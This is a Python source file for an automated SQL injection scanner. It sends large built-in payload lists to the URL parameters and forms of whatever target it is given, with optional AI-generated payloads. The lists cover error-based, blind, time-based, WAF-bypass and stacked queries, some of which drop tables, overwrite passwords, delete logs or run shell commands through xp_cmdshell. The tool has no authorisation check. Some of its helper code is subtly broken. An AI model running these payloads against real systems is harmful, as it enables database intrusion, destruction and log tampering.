import requests
import time
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

try:
    import bs4
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

DB_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL server version",
        r"Unknown column.*in 'field list'", r"Duplicate entry.*for key",
        r"Your SQL syntax is", r"Column count doesn't match",
        r"Table '.*' doesn't exist", r"MySQL server version for the right syntax",
        r"\[MySQL\]", r"\[mysqli\]", r"mysql_fetch", r"num_rows", r"mysql_result",
        r"mysql_error", r"mysql_query", r"MySQL\\.Driver", r"com\\.mysql",
        r"MariaDB server", r"Incorrect integer value", r"Data too long for column",
        r"commands out of sync", r"Packets out of order",
    ],
    "MSSQL": [
        r"Driver.*SQL Server", r"SQL Server.*Driver", r"Warning.*odbc_.*",
        r"Warning.*mssql_.*", r"OLE DB.*SQL Server", r"\"DRIVER=SQL Server",
        r"\"SQLOLEDB\"", r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
        r"Microsoft SQL Server", r"\[SQL Server\]", r"SQLServer JDBC Driver",
        r"com\.microsoft\.sqlserver", r"Line \d+:", r"Incorrect syntax near",
        r"Procedure.*expects parameter", r"String or binary data would be truncated",
        r"Violation of PRIMARY KEY", r"Could not find stored procedure",
        r"Invalid column name", r"Subquery returned more than 1 value",
    ],
    "Oracle": [
        r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_.*",
        r"Warning.*ora_.*", r"oracle\.jdbc", r"com\.oracle", r"PLS-\d{5}",
        r"ORA-\d{4}", r"oracle\.sql", r"quoted string not properly terminated",
        r"missing right parenthesis", r"table or view does not exist",
        r"insufficient privileges", r"invalid identifier", r"column not allowed here",
        r"Oracle JDBC Driver", r"Oracle SQLDeveloper",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpgsql\W", r"Warning.*pg_.*",
        r"valid PostgreSQL result", r"PG::Error", r"ERROR:\s+",
        r"pg_query", r"pg_exec", r"org\.postgresql", r"PSQLException",
        r"PostgreSQL query failed", r"column.*does not exist",
        r"relation.*does not exist", r"division by zero",
        r"function.*does not exist", r"operator.*does not exist",
        r"invalid input syntax for type", r"PostgreSQL JDBC",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
        r"Warning.*sqlite_.*", r"sqlite_.*\(.*\)", r"SQLite error",
        r"no such table:", r"no such column:", r"SQL logic error",
        r"UNIQUE constraint failed", r"FOREIGN KEY constraint failed",
        r"NOT NULL constraint failed", r"CHECK constraint failed",
        r"database is locked", r"out of memory",
    ],
    "Firebird": [
        r"Dynamic SQL Error", r"ISC ERROR", r"Firebird",
        r"isc_dsql_execute", r"Invalid token", r"Conversion error",
    ],
    "IBM DB2": [
        r"DB2 SQL error", r"ibm_db_dbi", r"com\.ibm\.db2", r"DB2 JDBC",
        r"SQLSTATE", r"DB2 Driver", r"CLI Driver",
    ],
    "Informix": [
        r"Informix.*SQL", r"com\.informix", r"Informix JDBC",
        r"ISAM error", r"Informix database",
    ],
    "Sybase": [
        r"Sybase.*message", r"Sybase.*Server", r"com\.sybase",
        r"Sybase SQL Server", r"Adaptive Server Enterprise",
    ],
    "HSQLDB": [
        r"HSQLDB", r"hypersql", r"org\.hsqldb", r"java\.sql\.SQLException",
    ],
}

ERROR_PATTERNS = []
for db, patterns in DB_ERROR_PATTERNS.items():
    for p in patterns:
        ERROR_PATTERNS.append((re.compile(p, re.I), db))

SQLI_PAYLOADS = {
    "error_based": {
        "MySQL": [
            ("'", "Single quote"),
            ("''", "Double quote"),
            ("\\", "Backslash"),
            ("' OR 1=1 -- ", "OR 1=1 comment"),
            ("' OR 1=1 #", "OR 1=1 hash"),
            ("' OR '1'='1", "OR 1=1 string"),
            ("' OR 1=1;-- ", "OR 1=1 semicolon"),
            ("' UNION SELECT 1 -- ", "UNION 1 col"),
            ("' UNION SELECT 1,2 -- ", "UNION 2 col"),
            ("' UNION SELECT 1,2,3 -- ", "UNION 3 col"),
            ("' UNION SELECT 1,2,3,4 -- ", "UNION 4 col"),
            ("' UNION SELECT 1,2,3,4,5 -- ", "UNION 5 col"),
            ("' UNION SELECT @@version,2,3 -- ", "UNION version"),
            ("' UNION SELECT database(),2,3 -- ", "UNION database"),
            ("' UNION SELECT user(),2,3 -- ", "UNION user"),
            ("1' ORDER BY 1 -- ", "ORDER BY 1"),
            ("1' ORDER BY 2 -- ", "ORDER BY 2"),
            ("1' ORDER BY 3 -- ", "ORDER BY 3"),
            ("1' ORDER BY 4 -- ", "ORDER BY 4"),
            ("1' ORDER BY 5 -- ", "ORDER BY 5"),
            ("1' ORDER BY 6 -- ", "ORDER BY 6"),
            ("1' ORDER BY 7 -- ", "ORDER BY 7"),
            ("1' ORDER BY 8 -- ", "ORDER BY 8"),
            ("1' ORDER BY 9 -- ", "ORDER BY 9"),
            ("1' ORDER BY 10 -- ", "ORDER BY 10"),
            ("-1' UNION SELECT 1,2,3 -- ", "Neg UNION"),
            ("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) -- ", "XPath error"),
            ("1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) -- ", "UpdateXML error"),
            ("1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- ", "Group by error"),
            ("1' AND 1=1 AND '\", extractvalue(1,concat(0x7e,version())) -- ", "Double inject"),
        ],
        "MSSQL": [
            ("'", "Single quote"),
            ("''", "Double quote"),
            ("\\", "Backslash"),
            ("' OR 1=1 -- ", "OR 1=1 comment"),
            ("' UNION SELECT 1 -- ", "UNION 1 col"),
            ("' UNION SELECT 1,2 -- ", "UNION 2 col"),
            ("' UNION SELECT 1,2,3 -- ", "UNION 3 col"),
            ("1' ORDER BY 1 -- ", "ORDER BY 1"),
            ("1' ORDER BY 2 -- ", "ORDER BY 2"),
            ("1' ORDER BY 3 -- ", "ORDER BY 3"),
            ("'; SELECT @@version; -- ", "MSSQL version"),
            ("'; EXEC xp_cmdshell('dir'); -- ", "xp_cmdshell"),
            ("'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- ", "Enable xp_cmdshell"),
            ("1' HAVING 1=1 -- ", "HAVING error"),
            ("1' GROUP BY 1 HAVING 1=1 -- ", "GROUP BY error"),
            ("1' UNION SELECT @@servername, @@version, db_name() -- ", "Server info"),
        ],
        "Oracle": [
            ("'", "Single quote"),
            ("''", "Double quote"),
            ("' OR 1=1 -- ", "OR 1=1"),
            ("' UNION SELECT NULL FROM DUAL -- ", "UNION NULL"),
            ("' UNION SELECT NULL,NULL FROM DUAL -- ", "UNION NULL,NULL"),
            ("' UNION SELECT NULL,NULL,NULL FROM DUAL -- ", "UNION NULL 3"),
            ("' UNION SELECT banner,NULL,NULL FROM v$version -- ", "Version from v$version"),
            ("' UNION SELECT user,NULL,NULL FROM dual -- ", "Current user"),
            ("' UNION SELECT global_name,NULL,NULL FROM global_name -- ", "Global name"),
            ("1' ORDER BY 1 -- ", "ORDER BY 1"),
        ],
        "PostgreSQL": [
            ("'", "Single quote"),
            ("' OR 1=1 -- ", "OR 1=1"),
            ("' UNION SELECT 1 -- ", "UNION 1"),
            ("' UNION SELECT 1,2 -- ", "UNION 2"),
            ("' UNION SELECT 1,2,3 -- ", "UNION 3"),
            ("1' ORDER BY 1 -- ", "ORDER BY 1"),
            ("'; SELECT version() -- ", "PG version"),
            ("' UNION SELECT current_database(),current_user,version() -- ", "PG info"),
            ("' UNION SELECT string_agg(table_name,','),NULL,NULL FROM information_schema.tables -- ", "PG tables"),
        ],
        "SQLite": [
            ("'", "Single quote"),
            ("' OR 1=1 -- ", "OR 1=1"),
            ("' UNION SELECT 1 -- ", "UNION 1"),
            ("' UNION SELECT 1,2 -- ", "UNION 2"),
            ("' UNION SELECT 1,2,3 -- ", "UNION 3"),
            ("1' ORDER BY 1 -- ", "ORDER BY 1"),
            ("' UNION SELECT sqlite_version(),2,3 -- ", "SQLite version"),
        ],
        "generic": [
            ("1' AND 1=1 -- ", "AND true"),
            ("1' AND 1=2 -- ", "AND false"),
            ("1' AND '1'='1", "AND true str"),
            ("1' AND '1'='2", "AND false str"),
            ("' OR SLEEP(5) -- ", "MySQL time"),
            ("'; WAITFOR DELAY '0:0:5' -- ", "MSSQL time"),
            ("' OR pg_sleep(5) -- ", "PG time"),
            ("' UNION ALL SELECT NULL -- ", "UNION ALL"),
            ("' UNION ALL SELECT NULL,NULL -- ", "UNION ALL 2"),
            ("' UNION ALL SELECT NULL,NULL,NULL -- ", "UNION ALL 3"),
            ("1' AND 1=1 UNION SELECT 1 -- ", "AND+UNION"),
            ("' AND 1=1 OR 'a'='a", "AND+OR tautology"),
            ("'; DROP TABLE users -- ", "Stacked drop"),
            ("'; SELECT * FROM users -- ", "Stacked select"),
        ],
    },
    "boolean_blind": {
        "numeric": [
            ("original_int + 0", "No-op"),
            ("original_int + 1", "Increment"),
            ("CASE WHEN 1=1 THEN original_int ELSE 999999 END", "True condition"),
            ("CASE WHEN 1=2 THEN 999999 ELSE original_int END", "False condition"),
            ("(SELECT CASE WHEN 1=1 THEN original_int ELSE (SELECT 1 UNION SELECT 2) END)", "Subquery true"),
        ],
        "string": [
            ("' OR '1'='1", "Always true"),
            ("' OR '1'='2", "Always false"),
            ("' AND '1'='1", "True"),
            ("' AND '1'='2", "False"),
            ("' OR 1=1 -- ", "OR true"),
            ("' OR 1=2 -- ", "OR false"),
            ("' AND SLEEP(0) -- ", "Time no sleep"),
            ("1' AND 1=1 -- ", "Int true"),
            ("1' AND 1=2 -- ", "Int false"),
        ],
    },
    "time_based": {
        "MySQL": [
            ("' OR SLEEP(3) -- ", "OR SLEEP"),
            ("' OR BENCHMARK(5000000,MD5('test')) -- ", "BENCHMARK"),
            ("' AND SLEEP(3) -- ", "AND SLEEP"),
            ("1' AND SLEEP(3) -- ", "Int AND SLEEP"),
            ("' OR IF(1=1,SLEEP(3),0) -- ", "IF SLEEP true"),
            ("' OR IF(1=2,SLEEP(3),0) -- ", "IF SLEEP false"),
            ("' OR (SELECT SLEEP(3)) -- ", "Subquery SLEEP"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(3)))a) -- ", "Derived SLEEP"),
            ("' UNION SELECT SLEEP(3) -- ", "UNION SLEEP"),
            ("' UNION ALL SELECT SLEEP(3) -- ", "UNION ALL SLEEP"),
            ("' OR SLEEP(0) -- ", "Baseline 0s"),
            ("1' AND BENCHMARK(10000000,MD5('a')) -- ", "Heavy benchmark"),
        ],
        "MSSQL": [
            ("'; WAITFOR DELAY '0:0:3' -- ", "WAITFOR"),
            ("1'; WAITFOR DELAY '0:0:3' -- ", "Int WAITFOR"),
            ("'; IF(1=1) WAITFOR DELAY '0:0:3' -- ", "IF WAITFOR true"),
            ("'; IF(1=2) WAITFOR DELAY '0:0:3' -- ", "IF WAITFOR false"),
            ("' OR 1=1; WAITFOR DELAY '0:0:3' -- ", "OR + WAITFOR"),
            ("' HAVING 1=1; WAITFOR DELAY '0:0:3' -- ", "HAVING + WAITFOR"),
            ("1' OR 1=1; WAITFOR DELAY '0:0:3' -- ", "Int OR WAITFOR"),
            ("' UNION SELECT NULL; WAITFOR DELAY '0:0:3' -- ", "UNION WAITFOR"),
        ],
        "PostgreSQL": [
            ("' OR pg_sleep(3) -- ", "OR pg_sleep"),
            ("' AND pg_sleep(3) -- ", "AND pg_sleep"),
            ("1' OR pg_sleep(3) -- ", "Int OR pg_sleep"),
            ("' UNION SELECT pg_sleep(3) -- ", "UNION pg_sleep"),
            ("' OR (SELECT pg_sleep(3)) IS NOT NULL -- ", "Subquery pg_sleep"),
            ("' OR CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END -- ", "CASE pg_sleep"),
            ("1' ; SELECT pg_sleep(3) -- ", "Stacked pg_sleep"),
            ("1' OR pg_sleep(0) -- ", "Baseline 0s"),
        ],
        "Oracle": [
            ("' OR UTL_INADDR.get_host_name('10.0.0.1') IS NOT NULL -- ", "DNS lookup time"),
            ("' OR ORD(1)+1 -- ", "CPU burn"),
            ("1' UNION SELECT 1 FROM dual WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE('x',3) IS NULL -- ", "DBMS_PIPE"),
            ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3) -- ", "DBMS_PIPE AND"),
            ("' OR (SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C) > 0 -- ", "Heavy cartesian"),
        ],
    },
    "waf_bypass": [
        ("' OR 1=1 -- ", "Standard"),
        ("' OR 1=1 #", "Hash comment"),
        ("' OR '1'='1' -- ", "String compare"),
        ("' OR 1=1-- ", "No space"),
        ("'OR 1=1--", "Compressed"),
        ("' OR/**/1=1 -- ", "Inline comment"),
        ("' OR 1=1-- -", "Double dash"),
        ("' OR 1=1;%00", "Null byte"),
        ("' OR 'x'='x'-- ", "X==X"),
        ("' OR 'x'=/'x/'-- ", "Regex compare"),
        ("' OR 1 LIKE 1 -- ", "LIKE bypass"),
        ("' UNION/**/SELECT/**/1,2,3 -- ", "UNION inline comment"),
        ("' UNION%0d%0aSELECT 1,2,3 -- ", "CRLF injection"),
        ("'/*!UNION*//*!SELECT*/1,2,3 -- ", "MySQL comment"),
        ("' UNION DISTINCT SELECT 1,2,3 -- ", "UNION DISTINCT"),
        ("%27%20OR%201%3D1%20--%20", "Full URL encode"),
        ("%25%37%32 OR 1=1 -- ", "Double URL encode"),
        ("' UNUNIONION SELSELECTECT 1,2 -- ", "Double function"),
        ("' UN/**/ION SEL/**/ECT 1,2 -- ", "Broken comment"),
        ("' oR 1=1 -- ", "Case variation"),
        ("' || 1=1 -- ", "Oracle concat"),
        ("' | 1=1 -- ", "Pipe bypass"),
        ("' /*!50000OR*/ 1=1 -- ", "Version comment"),
        ("'+OR+1%3D1--+", "URL encoded +"),
        ("'/**/OR/**/1=1/**/--", "All comments"),
        ("' OR 1=1 %23", "URL hash"),
        ("' OR '1'='1' %23", "String hash"),
        ("' OR '1'='1'--'", "Trailing quote"),
        ("' OR /*!12345678 1=1*/ -- ", "Comment directive"),
        ("1' OR 1=1 /*! , */ -- ", "Comma comment"),
        ("' OR 0x30=0x30 -- ", "Hex compare"),
        ("' OR 1=1 UNION SELECT 1,2,3 INTO @a,@b,@c -- ", "INTO variables"),
    ],
    "second_order": [
        ("';--", "Semicolon comment"),
        ("<script>alert('sqli')</script>", "XSS-SQL hybrid"),
        ("test@gmail.com;--", "Email with comment"),
        ("username' OR '1'='1", "Username injection"),
    ],
    "stacked_queries": [
        ("'; SELECT 1 -- ", "Simple stacked"),
        ("'; DROP TABLE IF EXISTS test_temp -- ", "Drop table"),
        ("'; CREATE TEMP TABLE test_temp (id INT) -- ", "Create temp"),
        ("'; INSERT INTO test_temp VALUES (1) -- ", "Insert temp"),
        ("'; UPDATE users SET pass='hacked' WHERE id=1 -- ", "Update"),
        ("'; DELETE FROM logs WHERE 1=1 -- ", "Delete logs"),
        ("'; EXEC xp_cmdshell('whoami') -- ", "MSSQL cmd"),
        ("'; SELECT pg_sleep(1) -- ", "PG stacked"),
        ("'; SELECT 1; SELECT 2 -- ", "Multi-stack"),
    ],
}


class AdvancedSQLIScanner:
    name = "sqli"
    description = "Advanced SQL injection scanner (error, boolean, time, union, WAF bypass, stacked queries, second-order)"

    @staticmethod
    def run(target, timeout=10, level=3, ollama_model=None):
        section(f"Advanced SQL Injection Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        parsed = urlparse(target)
        url_params = parse_qs(parsed.query)
        all_results = {"error_based": [], "boolean_blind": [], "time_based": [], "waf_bypass": [], "second_order": [], "dbms": None}

        has_params = bool(url_params)
        forms = []

        if HAS_BS4:
            try:
                resp = requests.get(target, timeout=timeout,
                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                soup = bs4.BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    method = form.get("method", "get").lower()
                    inputs = [inp.get("name") for inp in form.find_all("input") if inp.get("name")]
                    textareas = [ta.get("name") for ta in form.find_all("textarea") if ta.get("name")]
                    all_inputs = inputs + textareas
                    if all_inputs:
                        forms.append({
                            "action": urljoin(target, action),
                            "method": method,
                            "inputs": all_inputs,
                        })
                if forms:
                    info(f"Found {len(forms)} form(s) with injectable fields")
            except Exception:
                pass

        if not has_params and not forms:
            warning("No URL parameters or forms found to test")
            info("Try adding a known parameter: python3 main.py sqli 'http://target/page?id=1'")
            return {"target": target, "results": all_results}

        def test_url_param(param_name, payload, payload_type, payload_category):
            try:
                test_params = {k: v[0] for k, v in url_params.items()}
                test_params[param_name] = payload
                qs = urlencode(test_params)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))

                resp = requests.get(test_url, timeout=timeout,
                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

                return resp.text, resp.status_code, resp.elapsed.total_seconds()
            except Exception as e:
                return None, 0, 0

        def test_form_input(form_data, payload):
            try:
                if form_data["method"] == "post":
                    resp = requests.post(form_data["action"], data=fdata, timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                else:
                    resp = requests.get(form_data["action"], params=fdata, timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                return resp.text, resp.status_code, resp.elapsed.total_seconds()
            except:
                return None, 0, 0

        def detect_dbms(body, param_name):
            for pattern, db_name in ERROR_PATTERNS:
                if pattern.search(body):
                    return db_name
            return None

        if has_params:
            baseline = {}
            for param in url_params:
                baseline[param] = test_url_param(param, url_params[param][0], "baseline", "none")

            if ollama and ollama.available:
                section("Phase 0: Ollama Custom SQLi Payloads")
                detected_db = all_results.get("dbms")
                ai_payloads = ollama.generate_sqli_payloads(detected_db)
                if ai_payloads:
                    info(f"Ollama generated {len(ai_payloads)} custom payloads")
                    for param in url_params:
                        for payload in ai_payloads[:10]:
                            body, status, elapsed = test_url_param(param, payload, "ollama_sqli", "ollama")
                            if body is None:
                                continue
                            detected = detect_dbms(body, param)
                            if detected:
                                warning(f"[{param}] [Ollama] DB: {detected} (status {status})")
                                all_results["error_based"].append({
                                    "param": param, "payload": payload, "payload_name": "Ollama AI",
                                    "detected_db": detected, "type": "ollama",
                                })
                                if all_results["dbms"] is None:
                                    all_results["dbms"] = detected

            section("Phase 1: Error-Based Detection")
            for param in url_params:
                info(f"Testing param: {param}")
                for db_name, payloads in SQLI_PAYLOADS["error_based"].items():
                    for payload, payload_name in payloads:
                        body, status, elapsed = test_url_param(param, payload, "error_based", db_name)
                        if body is None:
                            continue
                        detected_db = detect_dbms(body, param)
                        if detected_db:
                            warning(f"[{param}] [{payload_name}] DB: {detected_db} (status {status})")
                            all_results["error_based"].append({
                                "param": param, "payload": payload, "payload_name": payload_name,
                                "detected_db": detected_db, "type": "error", "db_category": db_name,
                            })
                            if all_results["dbms"] is None:
                                all_results["dbms"] = detected_db
                        else:
                            generic_errors = [p for p, db in ERROR_PATTERNS if p.search(body or "")]
                            if generic_errors:
                                db_names = [db for _, db in ERROR_PATTERNS if any(p.search(body or "") for p, d in ERROR_PATTERNS if d == db)]
                                unique_dbs = list(set(db_names))
                                for db_name in unique_dbs:
                                    warning(f"[{param}] [{payload_name}] Error pattern matched: {db_name}")
                                    all_results["error_based"].append({
                                        "param": param, "payload": payload, "payload_name": payload_name,
                                        "detected_db": db_name, "type": "error", "db_category": db_name,
                                    })
                                    if all_results["dbms"] is None:
                                        all_results["dbms"] = db_name

            section("Phase 2: Boolean-Based Blind SQLi")
            for param in url_params:
                baseline_body, baseline_status, baseline_time = baseline[param]
                for test_type, payloads in SQLI_PAYLOADS["boolean_blind"].items():
                    for payload, payload_name in payloads:
                        resolved_payload = payload.replace("original_int", url_params[param][0]) if test_type == "numeric" else payload
                        body, status, elapsed = test_url_param(param, resolved_payload, "boolean_blind", test_type)
                        if body is None:
                            continue
                        body_len = len(body)
                        baseline_len = len(baseline_body or "")
                        diff = abs(body_len - baseline_len)
                        status_diff = status != baseline_status
                        if status_diff or (diff > 20 and baseline_len > 0):
                            true_payload = test_url_param(param, SQLI_PAYLOADS["boolean_blind"]["string"][0][1] if test_type == "string" else payload.replace("1=2", "1=1"), "boolean_blind", "true")
                            false_payload = test_url_param(param, SQLI_PAYLOADS["boolean_blind"]["string"][1][1] if test_type == "string" else payload.replace("1=1", "1=2"), "boolean_blind", "false")
                            true_body = true_payload[0] if true_payload else ""
                            false_body = false_payload[0] if false_payload else ""
                            if true_body and false_body and len(true_body) != len(false_body):
                                warning(f"[{param}] [{payload_name}] Boolean-based blind SQLi detected!")
                                all_results["boolean_blind"].append({
                                    "param": param, "payload": resolved_payload, "payload_name": payload_name,
                                    "true_len": len(true_body), "false_len": len(false_body), "baseline_len": baseline_len,
                                })

            section("Phase 3: Time-Based Blind SQLi")
            baseline_times = {}
            for param in url_params:
                _, _, bt = baseline[param]
                baseline_times[param] = bt

            for db_name, payloads in SQLI_PAYLOADS["time_based"].items():
                if level < 2 and db_name not in ["MySQL", "MSSQL", "PostgreSQL"]:
                    continue
                for param in url_params:
                    baseline_time = baseline_times.get(param, 0.5)
                    for payload, payload_name in payloads:
                        body, status, elapsed = test_url_param(param, payload, "time_based", db_name)
                        if body is None:
                            continue
                        if elapsed >= 2.5 and elapsed > baseline_time * 3:
                            warning(f"[{param}] [{payload_name}] Time-based SQLi! ({elapsed:.2f}s vs baseline {baseline_time:.2f}s)")
                            all_results["time_based"].append({
                                "param": param, "payload": payload, "payload_name": payload_name,
                                "elapsed": elapsed, "baseline": baseline_time, "dbms": db_name,
                            })
                            if all_results["dbms"] is None:
                                all_results["dbms"] = db_name

            if level >= 2:
                section("Phase 4: WAF Bypass Techniques")
                for param in url_params:
                    for payload, payload_name in SQLI_PAYLOADS["waf_bypass"]:
                        body, status, elapsed = test_url_param(param, payload, "waf_bypass", "generic")
                        if body is None:
                            continue
                        detected_db = detect_dbms(body, param) if body else None
                        if detected_db or status not in (403, 406, 501):
                            if body and any(p.search(body) for p, _ in ERROR_PATTERNS):
                                warning(f"[{param}] [{payload_name}] WAF bypass successful!")
                                all_results["waf_bypass"].append({
                                    "param": param, "payload": payload, "payload_name": payload_name,
                                    "status": status, "detected_db": detected_db,
                                })

        if forms and level >= 2:
            section("Phase 5: Form-Based SQLi Testing")
            for form_data in forms:
                info(f"Testing form: {form_data['action']} ({form_data['method']})")
                for db_name, payloads in SQLI_PAYLOADS["error_based"].items():
                    for payload, payload_name in payloads[:3]:
                        try:
                            fdata = {inp: payload for inp in form_data["inputs"]}
                            if form_data["method"] == "post":
                                resp = requests.post(form_data["action"], data=fdata, timeout=timeout,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
                            else:
                                resp = requests.get(form_data["action"], params=fdata, timeout=timeout,
                                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})

                            detected_db = detect_dbms(resp.text, f"form:{form_data['action']}")
                            if detected_db:
                                warning(f"[form:{form_data['action']}] [{payload_name}] DB: {detected_db}")
                                all_results["error_based"].append({
                                    "param": f"form:{form_data['action']}", "payload": payload, "payload_name": payload_name,
                                    "detected_db": detected_db, "type": "form",
                                })
                        except:
                            pass

        detected_db = all_results["dbms"]
        section("SQLi Scan Results Summary")
        total_findings = sum(len(v) for v in all_results.values() if isinstance(v, list))

        if detected_db:
            success(f"Detected DBMS: {detected_db}")

        findings_by_type = {
            "Error-based": len(all_results["error_based"]),
            "Boolean-based": len(all_results["boolean_blind"]),
            "Time-based": len(all_results["time_based"]),
            "WAF Bypasses": len(all_results["waf_bypass"]),
        }
        for ftype, count in findings_by_type.items():
            if count > 0:
                warning(f"  {ftype}: {count} finding(s)")

        if len(all_results["time_based"]) > 0:
            section("Time-Based Confirmation Details")
            for t in all_results["time_based"]:
                result(f"  [{t['param']}]", f"{t['dbms']} {t['payload_name']}: {t['elapsed']:.2f}s vs {t['baseline']:.2f}s baseline")

        if len(all_results["boolean_blind"]) > 0:
            section("Boolean-Based Confirmation Details")
            for b in all_results["boolean_blind"]:
                result(f"  [{b['param']}]", f"True={b['true_len']}b vs False={b['false_len']}b vs Baseline={b['baseline_len']}b")

        if total_findings == 0:
            warning("No SQL injection vulnerabilities detected")
            info("This does NOT mean the target is safe — manual testing recommended")

        return {"target": target, "results": all_results, "total_findings": total_findings}
